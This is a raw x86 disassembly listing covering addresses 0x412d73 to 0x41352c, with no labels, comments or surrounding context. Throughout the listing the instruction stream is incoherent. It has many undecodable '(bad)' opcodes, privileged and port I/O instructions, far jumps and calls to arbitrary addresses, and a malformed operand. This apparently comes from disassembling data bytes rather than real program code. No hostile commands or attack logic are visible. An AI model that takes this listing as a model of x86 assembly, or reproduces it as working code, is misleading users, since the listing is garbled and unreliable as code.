  412d73:	cmp    eax,0x524a77f9
  412d78:	sbb    ch,BYTE PTR [ecx]
  412d7a:	(bad)  
  412d7b:	and    al,0x2b
  412d7d:	add    eax,0x810492f7
  412d82:	test   al,0xa8
  412d84:	push   esp
  412d85:	jno    0x412d23
  412d87:	(bad)  
  412d88:	jae    0x412db9
  412d8a:	mov    cl,0x6b
  412d8c:	jo     0x412d67
  412d8e:	mov    bh,0x66
  412d90:	push   edx
  412d91:	mov    cl,0x64
  412d93:	cmp    edi,DWORD PTR [edi+0x3290bf04]
  412d99:	xor    BYTE PTR [ecx],ch
  412d9b:	xchg   esi,eax
  412d9c:	rdtsc  
  412d9e:	lahf   
  412d9f:	mov    eax,0x1c61e481
  412da4:	and    eax,0xeea6d5d6
  412da9:	add    DWORD PTR [esi+0x4f],0xfffffff1
  412dad:	adc    BYTE PTR [edx],bh
  412daf:	dec    eax
  412db0:	cmp    dh,BYTE PTR [edi+0x2e]
  412db3:	or     al,0x93
  412db5:	mov    bl,0xe3
  412db7:	mov    dl,0xf2
  412db9:	fsubr  QWORD PTR [ebp-0x388013c0]
  412dbf:	jmp    0xcab29d0f
  412dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dc5:	and    al,0xae
  412dc7:	pop    eax
  412dc8:	mov    cl,BYTE PTR [edx+esi*8]
  412dcb:	sti    
  412dcc:	inc    esi
  412dcd:	(bad)  
  412dcf:	inc    ebp
  412dd0:	lea    edx,[ecx+0x35]
  412dd3:	shl    BYTE PTR [ecx+eiz*8-0x4a],1
  412dd7:	sub    al,0x14
  412dd9:	cmp    eax,0x928ec451
  412dde:	aad    0x8b
  412de0:	int    0x98
  412de2:	pushf  
  412de3:	ret    
  412de4:	(bad)  
  412de5:	mov    esi,0x1d5d256
  412dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412deb:	adc    al,0x5b
  412ded:	outs   dx,DWORD PTR ds:[esi]
  412dee:	and    edx,DWORD PTR [edi-0x6d1f5685]
  412df4:	pop    ebp
  412df5:	dec    edi
  412df6:	inc    edx
  412df7:	mov    eax,ds:0xa0bfab76
  412dfc:	loop   0x412e46
  412dfe:	mov    al,ds:0xb2aa3ab2
  412e03:	jmp    FWORD PTR [edi-0x63]
  412e06:	dec    ebx
  412e07:	repz and cl,dl
  412e0a:	jo     0x412e14
  412e0c:	pop    esp
  412e0d:	inc    ecx
  412e0e:	and    bh,0x58
  412e11:	std    
  412e12:	and    eax,0xb3ae398a
  412e17:	clc    
  412e18:	adc    edi,edx
  412e1a:	xor    DWORD PTR [edi],ebp
  412e1c:	in     al,0x4c
  412e1e:	xchg   ecx,eax
  412e1f:	les    ebx,FWORD PTR [esi-0x78]
  412e22:	cli    
  412e23:	mov    ch,0xbc
  412e25:	mov    esi,0x22a2e755
  412e2a:	icebp  
  412e2b:	and    al,bh
  412e2d:	repnz popa 
  412e2f:	jg     0x412deb
  412e31:	mov    cl,0x56
  412e33:	mov    esi,0xf9736ce2
  412e38:	mov    ch,0xa8
  412e3a:	jnp    0x412e69
  412e3c:	mov    dh,dl
  412e3e:	mov    ah,0x2d
  412e40:	cwde   
  412e41:	cli    
  412e42:	lds    ebp,FWORD PTR [ecx]
  412e44:	int    0x52
  412e46:	cmc    
  412e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e48:	inc    ebx
  412e49:	das    
  412e4a:	pop    esi
  412e4b:	and    DWORD PTR [eax+ecx*8-0x6b],esi
  412e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e50:	pushf  
  412e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e52:	xor    eax,0xb692c943
  412e57:	push   eax
  412e58:	loop   0x412eb0
  412e5a:	leave  
  412e5b:	mov    bh,0x87
  412e5d:	dec    esi
  412e5e:	xchg   edx,ebp
  412e60:	or     BYTE PTR [ebx+0x42f63ee0],cl
  412e66:	adc    ebp,DWORD PTR [eax+edx*8+0x1b3611ec]
  412e6d:	int    0xad
  412e6f:	sbb    ebx,ebp
  412e71:	lahf   
  412e72:	ins    BYTE PTR es:[edi],dx
  412e73:	or     DWORD PTR [esi+0x42313786],edi
  412e79:	mov    esi,0xb0f923af
  412e7e:	(bad)  
  412e7f:	repnz (bad) 
  412e81:	fnstenv [ebx]
  412e83:	xor    ebx,edi
  412e85:	and    dl,BYTE PTR [edx*1-0x3882b184]
  412e8c:	jmp    0x9b6f:0x175673eb
  412e93:	mov    dh,0xdf
  412e95:	sub    edi,DWORD PTR [eax]
  412e97:	(bad)  
  412e99:	mov    esi,0xe511e7b7
  412e9e:	inc    esi
  412e9f:	gs call 0xd9bfc441
  412ea5:	push   edx
  412ea6:	mov    al,0xb3
  412ea8:	daa    
  412ea9:	cdq    
  412eaa:	push   ecx
  412eab:	ret    
  412eac:	pop    edi
  412ead:	sti    
  412eae:	jo     0x412e91
  412eb0:	jmp    FWORD PTR [eax-0x12e67728]
  412eb6:	hlt    
  412eb7:	mov    ebx,0x8f0735a
  412ebc:	popf   
  412ebd:	shl    BYTE PTR [ecx+edi*1+0x6d92fb08],cl
  412ec4:	inc    ecx
  412ec5:	sbb    DWORD PTR [eax-0x4b1d9ed2],eax
  412ecb:	inc    edi
  412ecc:	jno    0x412eb1
  412ece:	dec    esp
  412ecf:	retf   
  412ed0:	push   edx
  412ed1:	imul   esp,ebx,0x69
  412ed4:	nop
  412ed5:	cmp    bl,0x3
  412ed8:	inc    edi
  412ed9:	add    esp,eax
  412edb:	ret    0xac26
  412ede:	pushf  
  412edf:	xchg   ebx,eax
  412ee0:	(bad)  
  412ee1:	push   edi
  412ee2:	cld    
  412ee3:	cs int3 
  412ee5:	sub    ecx,DWORD PTR gs:[esi-0x62f49d4d]
  412eec:	cmp    eax,0x7dba8b73
  412ef1:	mov    esp,0x54a317d4
  412ef6:	sbb    bl,al
  412ef8:	sbb    al,0x52
  412efa:	ror    BYTE PTR [esi-0x31],0x2
  412efe:	mul    edi
  412f00:	lock adc dh,al
  412f03:	(bad)  
  412f04:	fst    DWORD PTR [ecx+0x4d0793a7]
  412f0a:	jo     0x412eb9
  412f0c:	in     al,dx
  412f0d:	mov    DWORD PTR [edx-0x1938b932],edi
  412f13:	ins    BYTE PTR es:[edi],dx
  412f14:	repz xor al,0x28
  412f17:	inc    eax
  412f18:	ffree  st(6)
  412f1a:	and    BYTE PTR [edx-0x7d9b83ca],dl
  412f20:	xchg   DWORD PTR [edx+eax*8],ebp
  412f23:	fsubr  st(5),st
  412f25:	and    al,0x1d
  412f27:	adc    ebp,DWORD PTR [ecx+0x68f2c6f7]
  412f2d:	sbb    BYTE PTR [edx-0x20],bh
  412f30:	mov    dh,0xf2
  412f32:	push   edx
  412f33:	jnp    0x412fa3
  412f35:	in     al,0x24
  412f37:	enter  0x22a8,0x64
  412f3b:	pushf  
  412f3c:	cmp    eax,0x3b4fa16b
  412f41:	stc    
  412f42:	sbb    BYTE PTR [ebp-0x4e],dh
  412f45:	dec    edi
  412f46:	inc    eax
  412f47:	lods   al,BYTE PTR ds:[esi]
  412f48:	adc    eax,0x133eb1f1
  412f4d:	add    BYTE PTR [ebx*8-0x6fcb928a],ah
  412f54:	and    ch,ah
  412f56:	dec    edi
  412f57:	and    eax,0xe3e4fbed
  412f5c:	retf   0x17c
  412f5f:	sub    bh,BYTE PTR [esi]
  412f61:	xchg   esp,eax
  412f62:	push   es
  412f63:	adc    esp,edi
  412f65:	jno    0x412f1c
  412f67:	xor    eax,0x34db633f
  412f6c:	push   cs
  412f6d:	mul    DWORD PTR [esi-0x5f]
  412f70:	(bad)  
  412f71:	dec    ebp
  412f72:	add    esi,DWORD PTR [ecx-0x68e12686]
  412f78:	xchg   ebx,eax
  412f79:	jp     0x412f71
  412f7b:	ja     0x412f1c
  412f7d:	or     edi,eax
  412f7f:	out    dx,eax
  412f80:	mov    ?,WORD PTR [ebp-0x53]
  412f83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f84:	inc    edx
  412f85:	mov    edx,DWORD PTR [ebp+0xf]
  412f88:	fmul   QWORD PTR [eax-0x337ca765]
  412f8e:	inc    edx
  412f8f:	and    cl,BYTE PTR [esp+ecx*8]
  412f92:	ja     0x412fdb
  412f94:	in     eax,dx
  412f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f96:	mov    DWORD PTR [eax-0x5b],ecx
  412f99:	stos   DWORD PTR es:[edi],eax
  412f9a:	push   eax
  412f9b:	dec    eax
  412f9c:	mul    BYTE PTR [ecx]
  412f9e:	test   DWORD PTR ds:0x18de6b2,eax
  412fa4:	xor    ebx,ebx
  412fa6:	shl    ch,0x61
  412fa9:	ret    0x10f2
  412fac:	add    al,0x43
  412fae:	xor    DWORD PTR [edx+0x25],ebx
  412fb1:	cwde   
  412fb2:	test   BYTE PTR [ecx],dl
  412fb4:	fcom   QWORD PTR [ecx]
  412fb6:	dec    edi
  412fb7:	mov    cs,WORD PTR [ecx+eiz*1+0x62]
  412fbb:	inc    esp
  412fbc:	mov    edx,0xdfe3b432
  412fc1:	aas    
  412fc2:	pop    ds
  412fc3:	adc    eax,0x7be01824
  412fc8:	in     eax,0x46
  412fca:	sbb    al,0x5a
  412fcc:	xchg   ebp,eax
  412fcd:	movzx  edi,BYTE PTR [ebp-0x5f]
  412fd1:	out    dx,al
  412fd2:	loopne 0x412feb
  412fd4:	mov    ecx,0x91fb879b
  412fd9:	xchg   ecx,eax
  412fda:	mov    ebx,0xf4a19f24
  412fdf:	dec    ecx
  412fe0:	ins    BYTE PTR es:[edi],dx
  412fe1:	int3   
  412fe2:	icebp  
  412fe3:	(bad)  
  412fe4:	out    dx,eax
  412fe5:	jle    0x41301c
  412fe7:	pop    edx
  412fe8:	inc    edi
  412fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fea:	mov    BYTE PTR ds:0x8efd78bc,ch
  412ff0:	cmp    dl,dl
  412ff2:	sub    DWORD PTR [ebx-0x6a],eax
  412ff5:	push   0xffffff9c
  412ff7:	cmp    eax,0xa519bf39
  412ffc:	jmp    0x25fc696c
  413001:	push   ds
  413002:	mov    eax,ds:0x33188b52
  413007:	icebp  
  413008:	(bad)
  41300b:	xchg   BYTE PTR [edi],bh
  41300d:	inc    edi
  41300e:	inc    edi
  41300f:	idiv   BYTE PTR [esi]
  413011:	adc    eax,0xa64ab022
  413016:	(bad)  
  413017:	es push esi
  413019:	in     eax,0xbb
  41301b:	cmp    al,0xdc
  41301d:	xchg   ebp,eax
  41301e:	inc    eax
  41301f:	cs sti 
  413021:	shr    BYTE PTR [ebp+0x71c10108],1
  413027:	xchg   ebx,eax
  413028:	mov    bl,BYTE PTR [ebp+0xac4130a]
  41302e:	dec    edx
  41302f:	imul   eax,DWORD PTR [edi-0x7706ea6],0x2508989a
  413039:	out    0x87,eax
  41303b:	enter  0xf21c,0x92
  41303f:	aaa    
  413040:	scas   al,BYTE PTR es:[edi]
  413041:	js     0x412ff9
  413043:	in     eax,dx
  413044:	sti    
  413045:	push   0xffffff94
  413047:	in     eax,0xf0
  413049:	mov    bh,0xd1
  41304b:	popa   
  41304c:	xchg   ebx,eax
  41304d:	xor    DWORD PTR [edx],ecx
  41304f:	daa    
  413050:	add    al,BYTE PTR [eax+0xcfb6489]
  413056:	or     BYTE PTR [edx+0x11],al
  413059:	adc    al,0xdd
  41305b:	pop    esi
  41305c:	imul   BYTE PTR [ebp+eax*4+0x79a0f25f]
  413063:	out    dx,eax
  413064:	scas   eax,DWORD PTR es:[edi]
  413065:	leave  
  413066:	(bad)  
  413068:	xor    al,0xcd
  41306a:	jb     0x4130d2
  41306c:	aaa    
  41306d:	add    cl,BYTE PTR [esi+0xb07bc64]
  413073:	jne    0x4130f3
  413075:	lahf   
  413076:	inc    edx
  413077:	jo     0x413048
  413079:	not    ebx
  41307b:	shr    BYTE PTR [ebp+0x6e],cl
  41307e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41307f:	lds    edi,FWORD PTR [ecx+0x6e]
  413082:	push   eax
  413083:	xor    ch,ah
  413085:	sub    ecx,ebp
  413087:	addr16 jns 0x41309c
  41308a:	stos   DWORD PTR es:[edi],eax
  41308b:	popf   
  41308c:	inc    esi
  41308d:	adc    eax,DWORD PTR [ecx+eax*1]
  413090:	dec    ebx
  413091:	lods   al,BYTE PTR ds:[esi]
  413092:	fidiv  WORD PTR [eax]
  413094:	cmp    al,0x4c
  413096:	loope  0x413049
  413098:	sbb    DWORD PTR [esi+0x36],edx
  41309b:	arpl   WORD PTR [edx],si
  41309d:	or     eax,0x5024113a
  4130a2:	jb     0x4130d3
  4130a4:	mov    edi,0xdadeb292
  4130a9:	loopne 0x4130bc
  4130ab:	mov    al,ds:0x2e0cb7d0
  4130b0:	or     eax,0xc636c7f6
  4130b5:	ret    
  4130b6:	or     ebp,DWORD PTR [edi]
  4130b8:	test   esp,edi
  4130ba:	mov    ecx,0x469c97cf
  4130bf:	jge    0x4130e3
  4130c1:	cmp    al,cl
  4130c3:	mov    ebx,0xaad85bb2
  4130c8:	adc    bl,BYTE PTR [ebx-0x1e]
  4130cb:	or     BYTE PTR [edi],cl
  4130cd:	sub    al,0xb0
  4130cf:	dec    edi
  4130d0:	inc    ebp
  4130d1:	adc    esp,DWORD PTR [edi-0x124c3b95]
  4130d7:	fistp  WORD PTR [esi+0x46]
  4130da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130db:	and    eax,edi
  4130dd:	fs mov bh,0x99
  4130e0:	ret    0x10e8
  4130e3:	pop    es
  4130e4:	dec    ebp
  4130e5:	cmp    DWORD PTR [eax],edi
  4130e7:	push   edx
  4130e9:	jnp    0x413087
  4130eb:	xchg   edx,eax
  4130ec:	jb     0x413082
  4130ee:	and    DWORD PTR [edi+0x572d86e3],ebp
  4130f4:	lock mov ds:0x7aff8fb9,al
  4130fa:	mov    ecx,0xd382c39f
  4130ff:	fcom   DWORD PTR [edx+0x76345676]
  413105:	cdq    
  413106:	xor    BYTE PTR ds:0xb9deace9,bh
  41310c:	(bad)  
  41310d:	ins    BYTE PTR es:[edi],dx
  41310e:	fld    QWORD PTR [ebx+0x2dfc66fb]
  413114:	cwde   
  413115:	les    ebp,FWORD PTR [edi+0x2fae7259]
  41311b:	lods   eax,DWORD PTR ds:[esi]
  41311c:	dec    esi
  41311d:	(bad)  
  41311e:	leave  
  41311f:	test   BYTE PTR [edx-0x24],cl
  413122:	sbb    eax,DWORD PTR [edi+0x5acb5bf4]
  413128:	inc    esi
  413129:	cmp    dl,BYTE PTR [eax]
  41312b:	lahf   
  41312c:	push   ss
  41312d:	dec    edi
  41312e:	jae    0x41319a
  413130:	inc    eax
  413131:	ss mov bh,0x75
  413134:	xor    BYTE PTR [edx+0x40fb6544],0xa4
  41313b:	std    
  41313c:	sub    al,0x40
  41313e:	imul   esp,DWORD PTR [ecx+0x5187adc0],0xbc961188
  413148:	out    0xb9,al
  41314a:	in     al,0x52
  41314c:	inc    esi
  41314d:	xor    esi,DWORD PTR [eax]
  41314f:	retf   0x7ff0
  413152:	push   ecx
  413153:	pop    esi
  413154:	dec    ecx
  413155:	add    eax,0xfffffffc
  413158:	lds    ebp,FWORD PTR [esi]
  41315a:	sub    al,0xaa
  41315c:	sti    
  41315d:	fcompp 
  41315f:	sar    bh,0xe6
  413162:	sbb    edi,esp
  413164:	push   edx
  413165:	(bad)  
  413166:	in     eax,dx
  413167:	popf   
  413168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413169:	dec    eax
  41316a:	cmp    eax,0x9c4a33ee
  41316f:	mov    bl,0x18
  413171:	mov    ds:0x4aab39c9,al
  413176:	adc    BYTE PTR [eax-0x2072786a],al
  41317c:	ja     0x413182
  41317e:	aad    0x33
  413180:	(bad)  
  413181:	cmc    
  413182:	fs js  0x41319f
  413185:	sub    al,0xce
  413187:	push   esi
  413188:	and    ecx,0x261d81e5
  41318e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41318f:	jbe    0x413149
  413191:	mov    ch,0x64
  413193:	lahf   
  413194:	mov    eax,ecx
  413196:	retf   0x14e2
  413199:	ds enter 0xec65,0xba
  41319e:	mov    cl,0xa5
  4131a0:	xor    DWORD PTR [ebx-0x1d2b71dd],edx
  4131a6:	inc    eax
  4131a7:	adc    BYTE PTR [esi+0x9e7b5ff],bl
  4131ad:	stos   BYTE PTR es:[edi],al
  4131ae:	gs mov dh,0x8b
  4131b1:	inc    DWORD PTR [esi-0x3d]
  4131b4:	nop
  4131b5:	and    DWORD PTR [ebp+0x11c6ee09],0xffffffa8
  4131bc:	sub    BYTE PTR [ecx-0x775fe472],dh
  4131c2:	mov    ecx,es
  4131c4:	push   esp
  4131c5:	test   al,0x93
  4131c7:	cmc    
  4131c8:	out    dx,al
  4131c9:	inc    ecx
  4131ca:	push   edx
  4131cb:	ret    
  4131cc:	sbb    cl,BYTE PTR [esi]
  4131ce:	mov    eax,ds:0x488139ea
  4131d3:	fst    DWORD PTR [ebx-0x15]
  4131d6:	imul   ebx,DWORD PTR [esi-0x2],0xffffffbc
  4131da:	test   BYTE PTR [eax+0x5b],cl
  4131dd:	popf   
  4131de:	push   0xffffffdd
  4131e0:	stos   BYTE PTR es:[edi],al
  4131e1:	mov    ebp,0xd2ff87db
  4131e6:	adc    eax,DWORD PTR ds:0x6956e9ea
  4131ec:	and    ebx,esi
  4131ee:	pop    edx
  4131ef:	sub    dh,cl
  4131f1:	add    edi,DWORD PTR [edx-0x6e]
  4131f4:	inc    ebp
  4131f5:	xlat   BYTE PTR ds:[ebx]
  4131f6:	in     eax,0xb9
  4131f8:	or     BYTE PTR [eax+ebp*1],ah
  4131fb:	loope  0x413268
  4131fd:	out    0x6c,eax
  4131ff:	in     eax,dx
  413200:	inc    ecx
  413201:	test   eax,0xca774932
  413206:	push   es
  413207:	and    dh,BYTE PTR [eax+0x1ee4feb0]
  41320d:	inc    edi
  41320e:	jno    0x413258
  413210:	mov    bl,0x13
  413212:	scas   al,BYTE PTR es:[edi]
  413213:	jae    0x4131a6
  413215:	mov    bl,0x2f
  413217:	xchg   edx,eax
  413218:	inc    edi
  413219:	out    0x1a,al
  41321b:	xor    ebp,ebp
  41321d:	shl    BYTE PTR [edi+0x2],cl
  413220:	aad    0xa
  413222:	inc    edi
  413223:	clc    
  413224:	scas   al,BYTE PTR es:[edi]
  413225:	sti    
  413226:	jge    0x4131ab
  413228:	jl     0x413298
  41322a:	or     al,0x2d
  41322c:	mov    edi,0x5ffae7c9
  413231:	xor    eax,0x4b7d4be8
  413236:	test   DWORD PTR [eax],0xb27c9e3a
  41323c:	xchg   DWORD PTR [ebx+0x33b6ecb7],ebp
  413242:	(bad)  [esi-0x4f21b49d]
  413248:	ja     0x413278
  41324a:	xor    ebp,DWORD PTR [esi-0xe127fcb]
  413250:	std    
  413251:	in     al,dx
  413252:	cmovno edx,DWORD PTR [eax+0x20d6c15d]
  413259:	(bad)  
  41325a:	hlt    
  41325b:	and    eax,0xce766517
  413260:	add    BYTE PTR [eax],bl
  413262:	adc    eax,0x9b9d9c12
  413267:	pop    edi
  413268:	sahf   
  413269:	cmp    bl,bl
  41326b:	sbb    DWORD PTR [edx+ebp*8+0x79],edi
  41326f:	adc    al,0xb2
  413271:	pop    ss
  413272:	lahf   
  413273:	dec    edx
  413274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413275:	aad    0x79
  413277:	pusha  
  413278:	sub    ch,ah
  41327a:	lods   eax,DWORD PTR ds:[esi]
  41327b:	push   esp
  41327c:	mov    esi,eax
  41327e:	inc    ebx
  41327f:	imul   bl
  413281:	int3   
  413282:	(bad)  
  413283:	pop    eax
  413284:	mov    al,0x4d
  413286:	pop    ds
  413287:	mov    ds:0x6278198a,eax
  41328c:	lods   al,BYTE PTR ds:[esi]
  41328d:	xchg   ecx,eax
  41328e:	stos   DWORD PTR es:[edi],eax
  41328f:	push   esp
  413290:	inc    edx
  413291:	xor    cl,BYTE PTR [esi+0x7053ffba]
  413297:	sub    DWORD PTR [edx],0x435e0ff6
  41329d:	in     eax,0x8f
  41329f:	scas   eax,DWORD PTR es:[edi]
  4132a0:	xchg   esp,eax
  4132a1:	pop    ds
  4132a2:	add    eax,DWORD PTR [ebp-0x285ab136]
  4132a8:	(bad)  
  4132a9:	push   ebx
  4132aa:	push   ecx
  4132ab:	sbb    DWORD PTR ds:0x7e02e912,edx
  4132b1:	cmc    
  4132b2:	sub    DWORD PTR [eax-0x6f37618b],ebp
  4132b8:	aas    
  4132b9:	sub    eax,0x20
  4132bc:	mov    ebp,DWORD PTR [ebp-0xb]
  4132bf:	(bad)  
  4132c0:	lea    ebp,[edi-0x17d06f5b]
  4132c6:	mov    ds:0x3be45ee9,al
  4132cb:	fidiv  WORD PTR [ebx]
  4132cd:	icebp  
  4132ce:	ja     0x41334a
  4132d0:	ins    BYTE PTR es:[edi],dx
  4132d1:	mov    dh,0x21
  4132d3:	stos   BYTE PTR es:[edi],al
  4132d4:	mov    ch,0x68
  4132d6:	lods   eax,DWORD PTR ds:[esi]
  4132d7:	nop
  4132d8:	cmp    eax,0x563d3f4b
  4132dd:	jb     0x41326a
  4132df:	mov    bh,0xd5
  4132e1:	out    0x2,al
  4132e3:	out    0xba,al
  4132e5:	lods   al,BYTE PTR ds:[esi]
  4132e6:	sub    DWORD PTR [eax],ecx
  4132e8:	add    DWORD PTR [eiz*4-0x6a8dc944],0x799162f2
  4132f3:	push   esi
  4132f4:	dec    edx
  4132f5:	ds daa 
  4132f7:	retf   0xd269
  4132fa:	jle    0x413330
  4132fc:	imul   BYTE PTR [edi+0x3f304e89]
  413302:	loope  0x413314
  413304:	ins    DWORD PTR es:[edi],dx
  413305:	arpl   sp,dx
  413307:	cld    
  413308:	or     ebx,DWORD PTR [esi-0x29]
  41330b:	daa    
  41330c:	popa   
  41330d:	scas   eax,DWORD PTR es:[edi]
  41330e:	(bad)  
  41330f:	or     al,BYTE PTR es:[ebp+edi*1+0x32ccfa26]
  413317:	es (bad) 
  413319:	mov    esp,0x91e9dc90
  41331e:	jbe    0x413370
  413320:	popf   
  413321:	leave  
  413322:	aad    0x3f
  413324:	add    DWORD PTR [esi-0x10e7a51d],edi
  41332a:	or     DWORD PTR [ebp-0xd1d35b5],ecx
  413330:	jns    0x4132ca
  413332:	pop    esp
  413333:	mov    eax,0x61b511a1
  413338:	and    BYTE PTR [eax+ecx*8-0x425f0ec7],dl
  41333f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413340:	sahf   
  413341:	test   al,0xc8
  413343:	xchg   edi,eax
  413344:	call   DWORD PTR [ecx+0x59]
  413347:	push   ebp
  413348:	fcom   DWORD PTR [edi+0x75]
  41334b:	imul   edi,ecx,0xffffffbe
  41334e:	in     eax,dx
  41334f:	xor    dh,cl
  413351:	call   0x256617e9
  413356:	ret    0x1104
  413359:	enter  0x68d5,0xbc
  41335d:	mov    eax,0x9bd80990
  413362:	test   DWORD PTR [ecx],edx
  413364:	shr    eax,cl
  413366:	ror    DWORD PTR [edi],0x50
  413369:	push   cs
  41336a:	fwait
  41336b:	in     eax,0xb8
  41336d:	or     DWORD PTR [edi],ebx
  41336f:	push   esp
  413370:	xchg   ecx,eax
  413371:	int3   
  413372:	jne    0x413373
  413374:	push   esi
  413375:	rol    DWORD PTR [eax],1
  413377:	sub    DWORD PTR [eax],esi
  413379:	fbld   TBYTE PTR [ecx+edi*2+0x1bee3ed0]
  413380:	jg     0x413336
  413382:	call   0x5ab1:0x412a556e
  413389:	stos   BYTE PTR es:[edi],al
  41338a:	loop   0x41332c
  41338c:	inc    ebp
  41338d:	xor    al,cl
  41338f:	pop    ebp
  413390:	ins    BYTE PTR es:[edi],dx
  413391:	icebp  
  413392:	dec    edx
  413393:	std    
  413394:	les    edi,FWORD PTR [esi-0x75151ecd]
  41339a:	push   0x6e
  41339c:	mov    ebp,0x36dea95f
  4133a1:	fimul  WORD PTR [ebp+0xc1ade99]
  4133a7:	imul   ecx,edi,0x26
  4133aa:	pop    ss
  4133ab:	dec    ecx
  4133ac:	xchg   BYTE PTR [ebp+ebp*2+0x7],al
  4133b0:	adc    al,0xdd
  4133b2:	or     esp,ebx
  4133b4:	fs mov bh,0x19
  4133b7:	push   0x59e4647b
  4133bc:	xor    BYTE PTR [esi-0x465298ff],0xc5
  4133c3:	push   esi
  4133c4:	push   eax
  4133c5:	loop   0x4133ae
  4133c7:	unpcklps xmm4,xmm2
  4133ca:	sbb    al,bl
  4133cc:	jno    0x4133c6
  4133ce:	std    
  4133cf:	inc    eax
  4133d0:	or     eax,0x658b3fca
  4133d5:	shl    ch,cl
  4133d7:	out    dx,eax
  4133d8:	inc    ecx
  4133d9:	jmp    0xebb5149f
  4133de:	pop    ds
  4133df:	fisubr DWORD PTR [edx-0x2bbde987]
  4133e5:	xchg   esp,eax
  4133e6:	and    ah,0x32
  4133e9:	jmp    0xeb19:0xd3269773
  4133f0:	cmp    cl,BYTE PTR [ecx]
  4133f2:	ret    0x6a0e
  4133f5:	pop    ds
  4133f6:	fucom  st(2)
  4133f8:	mov    al,ds:0x121593a9
  4133fd:	jae    0x4133ba
  4133ff:	push   eax
  413400:	ret    
  413401:	jae    0x4133c8
  413403:	int3   
  413404:	sub    esi,DWORD PTR [esi+eax*2]
  413407:	jns    0x41345d
  413409:	or     DWORD PTR [edx-0x6737fd63],esp
  41340f:	shl    DWORD PTR [edx-0x6fd40c89],0x96
  413416:	sbb    edx,DWORD PTR [ebx+0x4c]
  413419:	mov    dh,0x6d
  41341b:	xchg   edx,eax
  41341c:	out    0x3c,al
  41341e:	cmp    eax,0x96d29e6b
  413423:	push   0xffffff84
  413425:	xlat   BYTE PTR ds:[ebx]
  413426:	leave  
  413427:	cmp    eax,0xc06fa193
  41342c:	inc    eax
  41342d:	fnsave [edi+0x5b6d5235]
  413433:	add    BYTE PTR [ecx],cl
  413435:	std    
  413436:	loopne 0x4134af
  413438:	div    BYTE PTR [esi-0x5790f522]
  41343e:	idiv   DWORD PTR [ebx+0x1a80e35c]
  413444:	imul   eax,DWORD PTR [esi+0x15],0x2eec35b3
  41344b:	cmp    al,0x2d
  41344d:	xor    DWORD PTR [ebp-0x56f1a110],0x1e1bf249
  413457:	nop
  413458:	mov    bl,0xc0
  41345a:	stos   BYTE PTR es:[edi],al
  41345b:	(bad)  
  41345c:	sar    dh,1
  41345e:	cmp    BYTE PTR [eax-0xcb91949],ch
  413464:	ja     0x4134cd
  413466:	xchg   BYTE PTR [ebx-0x76],ah
  413469:	jge    0x4134d4
  41346b:	sub    WORD PTR [ebx],si
  41346e:	aaa    
  41346f:	xchg   DWORD PTR [ecx+0xc],eax
  413472:	or     DWORD PTR [esi-0x60],0x24891ae7
  413479:	cwde   
  41347a:	jb     0x4134a5
  41347c:	push   ds
  41347d:	fwait
  41347e:	lahf   
  41347f:	sbb    DWORD PTR [edi+0x45],0xb0bfae15
  413486:	add    cl,BYTE PTR [esi-0x1e]
  413489:	push   ebp
  41348a:	popa   
  41348b:	add    BYTE PTR [ecx],ah
  41348d:	aas    
  41348e:	and    BYTE PTR [edx-0x43],dh
  413491:	push   edi
  413492:	xor    eax,0xb78b5695
  413497:	pop    edi
  413498:	sub    bh,BYTE PTR [edx]
  41349a:	xchg   DWORD PTR [ebx+ebx*8],edi
  41349d:	aaa    
  41349e:	dec    eax
  41349f:	xchg   DWORD PTR [ebp+0x57aaf892],eax
  4134a5:	dec    edx
  4134a6:	ins    DWORD PTR es:[edi],dx
  4134a7:	hlt    
  4134a8:	jl     0x413498
  4134aa:	(bad)  
  4134ac:	nop
  4134ad:	mov    ebp,0x44641568
  4134b2:	and    DWORD PTR [ebx-0x7e],ebp
  4134b5:	sbb    al,0x32
  4134b7:	pushf  
  4134b8:	stos   DWORD PTR es:[edi],eax
  4134b9:	adc    BYTE PTR [ecx+0x2],0x60
  4134bd:	adc    BYTE PTR [ebp+0x48b6ad3f],ch
  4134c3:	lods   al,BYTE PTR ds:[esi]
  4134c4:	mov    DWORD PTR [ecx],0x38fea010
  4134ca:	adc    DWORD PTR [ebp+0x794cb808],0xbca782e9
  4134d4:	sbb    esp,DWORD PTR [edx-0x80]
  4134d7:	fldlg2 
  4134d9:	dec    esp
  4134da:	cli    
  4134db:	popa   
  4134dc:	int    0x68
  4134de:	into   
  4134df:	add    DWORD PTR [ebx+ecx*1],ebp
  4134e2:	call   0x46f4ab48
  4134e7:	jns    0x41348a
  4134e9:	neg    DWORD PTR [eax]
  4134eb:	rcr    BYTE PTR [esi-0xd],1
  4134ee:	fadd   DWORD PTR [ecx-0xb]
  4134f1:	lock sbb cl,0xd5
  4134f5:	push   ebp
  4134f6:	stos   BYTE PTR es:[edi],al
  4134f7:	ja     0x4134a0
  4134f9:	sbb    BYTE PTR [ebp+edx*4-0x4],0x5
  4134fe:	xchg   ebx,eax
  4134ff:	mov    al,ds:0x42268241
  413504:	lods   eax,DWORD PTR ds:[esi]
  413505:	push   ebx
  413506:	pop    ebx
  413507:	rcl    DWORD PTR [eax],cl
  413509:	inc    edi
  41350a:	mov    ds:0x2b2512aa,eax
  41350f:	or     BYTE PTR [edi],dl
  413511:	cdq    
  413512:	sub    cl,bh
  413514:	icebp  
  413515:	inc    esi
  413516:	fcomp  DWORD PTR [eax-0x24]
  413519:	pop    eax
  41351a:	add    BYTE PTR [edi+0x7e],al
  41351d:	xor    al,0xe7
  41351f:	cmc    
  413520:	xor    dh,BYTE PTR [ecx-0x20]
  413523:	ss pop edi
  413525:	xchg   ecx,eax
  413526:	jmp    0x77bde214
  41352b:	pop    esp
  41352c:	or     edx,DWORD PTR [eax]
